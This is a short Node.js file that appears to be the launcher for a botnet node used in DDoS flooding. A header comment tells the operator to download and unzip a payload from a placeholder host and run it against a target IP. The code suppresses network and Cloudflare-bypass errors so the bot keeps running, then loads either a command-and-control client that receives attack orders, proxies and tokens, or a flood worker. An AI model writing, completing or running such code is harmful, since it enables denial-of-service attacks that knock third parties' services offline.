// Payload;
// Requirements: Node.js installed;
// npm install request;npm install cloudscraper;npm install zombie;wget ZIP_DOWNLOAD/load.zip;unzip load.zip;node main IP

const {
    isMainThread
} = require('worker_threads');
process.on('SIGCHILD', () => {
    return !1;
}).on('SIGHUP', () => {
    return !1;
});
let ignoreNames = ['RequestError', 'StatusCodeError', 'CaptchaError', 'CloudflareError', 'ParseError'],
    ignoreCodes = ['ECONNRESET', 'ERR_ASSERTION', 'ECONNREFUSED', 'EPIPE', 'EHOSTUNREACH', 'ETIMEDOUT', 'ESOCKETTIMEDOUT'];

process.on('uncaughtException', function (e) {
    if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
    console.warn(e);
}).on('unhandledRejection', function (e) {
    if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
    console.warn(e);
}).on('warning', e => {
    if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
    console.warn(e);
});

// Avoid memory leak crashes:
process.setMaxListeners(0);
let events = require('events');
events.EventEmitter.defaultMaxListeners = Infinity;
events.EventEmitter.prototype._maxListeners = Infinity;
// Requires and init:

if (isMainThread) {
    // Require CNC client: To receive attack executions, data (proxies, privacypass tokens, and so...)
    require('./client');
} else {
    require('./flood');
}